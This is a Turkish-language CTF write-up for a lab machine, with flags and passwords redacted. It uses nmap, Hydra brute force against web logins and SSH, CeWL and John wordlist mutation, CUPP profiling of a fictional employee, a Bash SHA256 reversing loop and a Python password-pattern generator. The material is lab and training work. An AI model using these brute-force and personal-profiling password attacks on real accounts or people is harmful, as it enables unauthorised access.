
```markdown
# 🎯 CTF Write-Up: [Oda Adı] (Premium)

Bu repo, [Oda Adı] adlı premium CTF makinesinin çözüm adımlarını içermektedir. Çözüm sürecinde standart araçların ötesine geçilmiş; hedef odaklı kelime listesi oluşturma (CUPP), web kazıma (OSINT), Bash scripting ile hash kırma ve Python ile spesifik parola deseni (pattern) üretimi gibi ileri seviye sızma testi teknikleri kullanılmıştır. 

*(Not: Hedef premium bir oda olduğu için kurallar gereği tespit edilen parolalar ve bayraklar `[REDACTED]` şeklinde gizlenmiştir.)*

---

## 1. Keşif ve Bilgi Toplama (Reconnaissance)

Hedef makineye yönelik bilgi toplama aşamasına açık portları ve çalışan servisleri tespit etmek için kapsamlı bir Nmap taraması ile başlıyoruz:

```bash
nmap -sC -sV -T5 <TARGET_IP>

```

**Nmap Çıktısı:**

```plaintext
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
5001/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
5002/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
5003/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)

```

Çıktıyı incelediğimizde standart SSH (22) portunun yanı sıra dört farklı portta (5000-5003) web sunucularının (Werkzeug) çalıştığını görüyoruz.

### Web Numaralandırma (Web Enumeration)

**Port 5000 (Operation Checkmate):**
Bu porta tarayıcı üzerinden eriştiğimizde, kritik bir ipucu ile karşılaşıyoruz:

> *"Marco deployed a firewall at firewall.thm:5001 but kept default credentials."*

Bu mesaj bize iki önemli bilgi veriyor:

1. `/etc/hosts` dosyamıza `firewall.thm` adresini eklemeliyiz.
2. 5001 numaralı portta çalışan servise varsayılan (default) kimlik bilgileriyle giriş yapılabilir.

---

## 2. İlk Erişim (Initial Access) - Brute Force

**Port 5001 (FirewallOS):**
5001 portuna gittiğimizde karşımıza bir giriş paneli çıkıyor. İpucunda bahsedilen varsayılan kimlik bilgilerini bulmak için sayfanın kaynak kodunu (Source Code) inceliyoruz ve `username` input alanında şu detayı yakalıyoruz:

```html
<input class="form-control" name="username" autocomplete="username" placeholder="admin" required="">

```

`placeholder="admin"` kısmı, sistemin varsayılan kullanıcısının **admin** olduğuna dair çok güçlü bir işaret. Parolayı bulmak için `rockyou.txt` kelime listesini kullanarak Hydra ile bir brute-force saldırısı başlatıyoruz:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 5001 <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

```

Hydra taraması kısa süre içinde başarıyla sonuçlanıyor ve `admin` kullanıcısına ait parolayı elde ediyoruz.

---

## 3. İç Ağ Keşfi ve Hedefe Yönelik Brute Force

İlk aşamadan elde ettiğimiz ipuçları bizi 5002 portunda çalışan "Employee Login" (Çalışan Girişi) paneline yönlendiriyor. Burada kritik bir bilgiyle karşılaşıyoruz:

> *"Marco built an internal Employee Login panel on jobs.thm:5002 and used common company keywords as passwords."*

Bu bilgi, Marco adlı kullanıcının şifresinin web sitesinde geçen şirket içi kelimelerden türetildiğini gösteriyor.

### Web Kazıma (Scraping) ve Kelime Listesi (Wordlist) Oluşturma

Hedef web sayfasındaki kelimeleri toplayarak kendimize özel bir sözlük oluşturmak için CeWL veya benzeri bir araç kullanarak sayfayı kazıyoruz. Elde ettiğimiz ham kelime listesi (`lab1.txt`) şu şekilde:

```plaintext
security
excellence
careers
apply
...
soc
operational

```

### John the Ripper ile Kelime Listesini Mutasyona Uğratma

Çalışanların kelimelerin sonuna rakam ekleme veya baş harfini büyük yazma gibi alışkanlıkları olabileceği için, John the Ripper'ın kural (rules) motorunu kullanarak kelimeleri mutasyona uğratıyoruz:

```bash
wc -l mutated_step2.txt
# Çıktı: 4846 mutated_step2.txt

```

İşlem sonucunda 4846 kelimelik çok daha güçlü ve hedefe yönelik bir şifre yelpazesi elde ediyoruz.

### Hydra ile Parola Kırma

Hazırladığımız bu özel listeyi kullanarak 5002 portundaki giriş formuna saldırıyı başlatıyoruz:

```bash
hydra -l marco -P mutated_step2.txt -s 5002 <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V

```

**Hydra Çıktısı:**

```plaintext
[DATA] attacking http-post-form://10.114.135.239:5002/login:username=^USER^&password=^PASS^:F=invalid
...
[5002][http-post-form] host: 10.114.135.239   login: marco   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found

```

Marco'nun şirket kelimelerinden birini kullanarak oluşturduğu parolayı kırarak sisteme giriş yetkisi kazanıyoruz.

---

## 4. Sosyal Mühendislik ve Profil Çıkarma (OSINT & Profiling)

Marco'nun hesabına 5002 portundan giriş yaptıktan sonra, onunla ilgili kişisel bilgiler (isim, soyisim, doğum tarihi, takma ad vb.) elde ediyoruz ve yeni bir ipucu buluyoruz:

> *"Navigate to social.thm:5003 and derive Marco's password from personal info."*

### Bilgi Toplama ve Şirket Adını Doğrulama

CUPP (Common User Passwords Profiler) ile profilleme yapmadan önce, şirketin tam adını doğrulamak için 5002 portundaki sayfayı `curl` ile indirip `grep` ile analiz ediyoruz:

```bash
curl -s [http://firewall.thm:5002/](http://firewall.thm:5002/) -o page.html
grep -i -E "mht|staff|employee|portal|internal|disabled" page.html

```

**Çıktı:**

```html
<li class="nav-item"><a class="btn btn-outline-primary btn-sm ms-lg-2" href="#" onclick="inert(event)">Candidate Portal</a></li><li class="nav-item"><a class="btn btn-primary btn-sm ms-lg-2" href="/login">Employee Login</a></li><input class="form-control" placeholder="e.g., Security Engineer" disabled>
© MHT Labs Careers <div class="toast-body">This feature is disabled in the lab demo.</div>

```

Hedefin çalıştığı şirketin adının **MHT Labs Careers** olduğunu netleştiriyoruz.

### CUPP ile Hedefe Özel Wordlist Üretimi

Elde ettiğimiz verileri (Marco, Bianchi, marky, 14021995 ve MHT Labs Careers) kullanarak CUPP aracını çalıştırıyoruz. Özel karakter, rastgele sayı ekleme ve "leet" seçeneklerini aktif ediyoruz:

```bash
cupp -i

[+] Insert the information about the victim to make a dictionary
> First Name: Marco
> Surname: Bianchi
> Nickname: marky
> Birthdate (DDMMYYYY): 14021995
> Company name: MHT Labs Careers
> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma: IT
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]: Y
> Leet mode? (i.e. leet = 1337) Y/[N]: Y

[+] Saving dictionary to marco.txt, counting 16324 words.

```

### Hydra ile Brute Force ve Sisteme Erişim

Doğrudan Marco'nun hayatına göre şekillendirilmiş 16.324 kelimelik `marco.txt` ile 5003 portuna saldırıyoruz:

```bash
hydra -l marco -P marco.txt -s 5003 <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V

```

Doğru kombinasyonu yakalıyor ve Marco'nun parolasını (`[REDACTED]`) başarıyla kırıyoruz.

---

## 5. Kriptografi ve Hash Kırma (SHA256 Reversing)

`social.thm:5003` platformuna giriş yaptıktan sonra yeni bir görevle karşılaşıyoruz:

> *"On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco’s uploaded profile picture."*

### Hash Değerinin Tespiti

Sayfadaki profil resmini incelediğimizde (Inspect Element) hash değerini tespit ediyoruz:

```html
<img src="/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png" alt="Profile Picture">

```

*Hedef Hash:* `d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b`

### Bash Scripting ile Otomatize Hash Kırma

Kişisel wordlist'imiz sonuç vermeyince, `rockyou.txt` içerisindeki kelimelerin SHA256 hash'lerini alarak hedef hash ile karşılaştıran özel bir Bash script kurguluyoruz:

```bash
TARGET="d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b"
while read word; do
  hash=$(echo -n "$word" | sha256sum | awk '{print $1}')
  if [ "$hash" == "$TARGET" ]; then
    echo "BULUNDU: $word"
  fi
done < /usr/share/wordlists/rockyou.txt

```

**Çıktı:**

```plaintext
BULUNDU: [REDACTED]

```

Orijinal dosya adını başarıyla tespit ediyoruz.

---

## 6. SSH Erişimi ve Hedefe Yönelik Brute Force (Custom Pattern)

Platform üzerinde Marco'nun kritik bir parola oluşturma alışkanlığı (pattern) tespit ediliyor:

> *"My tip for strong password: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark."*

Format: `[Büyük Harfle Başlayan Kelime] + [Yıl/Sayı] + [!]` (Örn: Mht2024!)

### Python ile Özel Kelime Listesi Üretimi

Bu spesifik kural dizisine uygun bir wordlist üretmek için `step5.py` adında bir Python betiği yazıyoruz:

```python
#!/usr/bin/env python3
"""
Marco Bianchi için ipucuna dayalı şifre listesi üreteci.
"""

words = ["Mht", "Marco", "Bianchi", "Marky", "Firewall", "Checkmate","Security"]
output_file = "smart_pattern.txt"

with open(output_file, "w") as f:
    for word in words:
        for year in range(1990, 2027):
            f.write(f"{word}{year}!\n")

print(f"[+] '{output_file}' dosyası oluşturuldu.")
print(f"[+] Toplam satır sayısı: {len(words) * (2027 - 1990)}")

```

Betiği çalıştırdığımızda 259 satırdan oluşan, nokta atışı bir parola listesi elde ediyoruz:

```bash
python3 step5.py
# Çıktı:
# [+] 'smart_pattern.txt' dosyası oluşturuldu.
# [+] Toplam satır sayısı: 259

```

### Olası Kullanıcı Adları ve SSH Brute Force

Olası kullanıcı adlarını içeren küçük bir `users.txt` dosyası oluşturuyoruz:

```bash
echo -e "marco\nmarco.bianchi\nmbianchi\nmarky" > users.txt

```

Son adım olarak, Hydra'yı SSH servisine (Port 22) yönlendiriyoruz:

```bash
hydra -L users.txt -P smart_pattern.txt ssh://<TARGET_IP> -t 4 -V

```

Akıllı kelime listesi sayesinde çok kısa bir süre içinde eşleşmeyi yakalıyor, sisteme `marco` kullanıcısı olarak SSH erişimi sağlıyor ve makineyi (User/Root) başarıyla ele geçiriyoruz!

---

## 🎯 Kapanış ve Çıkarımlar

Bu makine, standart araçların ötesine geçerek hedef odaklı düşünmenin önemini vurgulayan harika bir senaryoya sahipti. Odanın çözüm sürecinde:

* Açık kaynak istihbaratı (OSINT) ve profil çıkarma (CUPP) ile kişiselleştirilmiş kelime listeleri oluşturduk.
* Web kazıma (Web Scraping) yaparak hedefe özel veriler topladık.
* SHA256 Hash kırma işlemlerini Bash scripting ile otomatize ettik.
* Parola desenlerini (patterns) analiz ederek Python ile kendi wordlist üretici aracımızı kodladık.

```

```
